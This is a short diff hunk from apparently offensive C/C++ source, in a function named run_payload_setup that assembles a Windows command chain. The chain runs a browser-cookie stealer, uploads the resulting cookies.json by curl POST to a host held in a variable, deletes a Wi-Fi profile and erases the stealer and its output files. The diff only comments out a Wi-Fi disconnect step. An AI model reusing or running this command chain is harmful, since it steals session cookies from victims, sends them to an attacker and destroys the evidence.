@@ -185,7 +185,7 @@ void run_payload_setup(){
   " && .\\GCC-stealer.exe --json-file" \
   " && timeout /t 5" \
   " && curl -X POST -F data=@cookies.json http://"+str+"/upload" \
-  " & netsh wlan disconnect" \
+  /*" & netsh wlan disconnect" \*/
   " & netsh wlan delete profile "+ssid+"" \
   " & del cookies.json GCC-stealer.exe Wi-Fi-AP-0.xml & exit";
 
